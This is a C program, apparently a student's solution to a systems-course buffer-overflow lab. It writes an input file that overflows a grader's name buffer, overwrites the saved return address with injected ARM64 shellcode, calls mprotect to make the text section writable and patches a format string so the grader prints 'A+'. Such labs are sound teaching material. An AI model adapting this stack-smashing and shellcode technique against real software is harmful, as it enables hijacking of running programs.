/*------------------------------------------------------------------*/
/* createdataAplus.c                                                */
/* Author: Kevin Tran                                               */
/*------------------------------------------------------------------*/
/* Produces a file called dataAplus that causes the grader to output
"A+ is your grade." The attack works by overflowing the name buffer
to overwrite getName's saved x30 with the address of shellcode
injected into the name array. The shellcode calls mprotect to make
the text section writable, then overwrites the two bytes "%c" in the
printf format string with "A+", then branches back into main at the
printf call. Since the format string now reads "A+ is your grade.\n"
with no format specifier, printf prints it literally. */

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* writes binary data to dataAplus file to exploit buffer overflow.
   takes no command line arguments, reads nothing from stdin,
   writes attack data to dataAplus file, writes nothing to stdout,
   returns 0 on success. */
int main(void) {
    FILE *fp;
    int i;
    uint64_t shellcode_addr;
    unsigned int instr1, instr2, instr3, instr4, instr5,
                 instr6, instr7, instr8, instr9, instr10, instr11;
    unsigned char *bytes;

    fp = fopen("dataAplus", "wb");

    /* write truncated name "K" plus null terminator (2 bytes) */
    fputc('K', fp);
    fputc('\0', fp);

    /* write 2 alignment bytes so shellcode lands at 0x42005c */
    fputc('\0', fp);
    fputc('\0', fp);

    /* shellcode: 11 instructions x 4 bytes = 44 bytes, at 0x42005c */

    /* instruction 1 at 0x42005c: adr x0, 0x400000
       loads page-aligned base of text section for mprotect call */
    instr1 = MiniAssembler_adr(0, 0x400000, 0x42005c);

    /* instruction 2 at 0x420060: mov w1, #0x1 mprotect length = 1 
    (rounds up to full page, covers format string) */
    instr2 = MiniAssembler_mov(1, 0x1);

    /* instruction 3 at 0x420064: mov w2, #0x7
       mprotect prot = PROT_READ|PROT_WRITE|PROT_EXEC */
    instr3 = MiniAssembler_mov(2, 0x7);

    /* instruction 4 at 0x420068: bl 0x4006a0
       call mprotect PLT, saves return address 0x42006c in x30 */
    instr4 = MiniAssembler_bl(0x4006a0, 0x420068);

    /* instruction 5 at 0x42006c: adr x0, 0x400920 load address of 
    format string (currently "%c is your grade.\n") */
    instr5 = MiniAssembler_adr(0, 0x400920, 0x42006c);

    /* instruction 6 at 0x420070: mov w1, #0x41
       load 'A' to overwrite '%' at format string[0] */
    instr6 = MiniAssembler_mov(1, 0x41);

    /* instruction 7 at 0x420074: strb w1, [x0] write 'A' to 0x400920,
       format string now "Ac is your grade.\n" */
    instr7 = MiniAssembler_strb(1, 0);

    /* instruction 8 at 0x420078: adr x0, 0x400921
       load address of format string byte 1 (currently 'c') */
    instr8 = MiniAssembler_adr(0, 0x400921, 0x420078);

    /* instruction 9 at 0x42007c: mov w1, #0x2b
       load '+' to overwrite 'c' at format string[1] */
    instr9 = MiniAssembler_mov(1, 0x2b);

    /* instruction 10 at 0x420080: strb w1, [x0] write '+' to 
    0x400921, format string now "A+ is your grade.\n" */
    instr10 = MiniAssembler_strb(1, 0);

    /* instruction 11 at 0x420084: b 0x40089c branch to main+64 which 
    calls printf with now-modified format string */
    instr11 = MiniAssembler_b(0x40089c, 0x420084);

    /* write all 11 instructions as raw bytes */
    bytes = (unsigned char *)&instr1;
    for (i = 0; i < 4; i++) { fputc(bytes[i], fp); }

    bytes = (unsigned char *)&instr2;
    for (i = 0; i < 4; i++) { fputc(bytes[i], fp); }

    bytes = (unsigned char *)&instr3;
    for (i = 0; i < 4; i++) { fputc(bytes[i], fp); }

    bytes = (unsigned char *)&instr4;
    for (i = 0; i < 4; i++) { fputc(bytes[i], fp); }

    bytes = (unsigned char *)&instr5;
    for (i = 0; i < 4; i++) { fputc(bytes[i], fp); }

    bytes = (unsigned char *)&instr6;
    for (i = 0; i < 4; i++) { fputc(bytes[i], fp); }

    bytes = (unsigned char *)&instr7;
    for (i = 0; i < 4; i++) { fputc(bytes[i], fp); }

    bytes = (unsigned char *)&instr8;
    for (i = 0; i < 4; i++) { fputc(bytes[i], fp); }

    bytes = (unsigned char *)&instr9;
    for (i = 0; i < 4; i++) { fputc(bytes[i], fp); }

    bytes = (unsigned char *)&instr10;
    for (i = 0; i < 4; i++) { fputc(bytes[i], fp); }

    bytes = (unsigned char *)&instr11;
    for (i = 0; i < 4; i++) { fputc(bytes[i], fp); }

    /* no additional padding needed: 
    4 (name) + 44 (shellcode) = 48 bytes exactly fills buf */

    /* shellcode start address 0x42005c as getName's return address */
    shellcode_addr = 0x42005c;
    fwrite(&shellcode_addr, sizeof(shellcode_addr), 1, fp);

    /* write newline to terminate input */
    fputc('\n', fp);

    fclose(fp);
    return 0;
}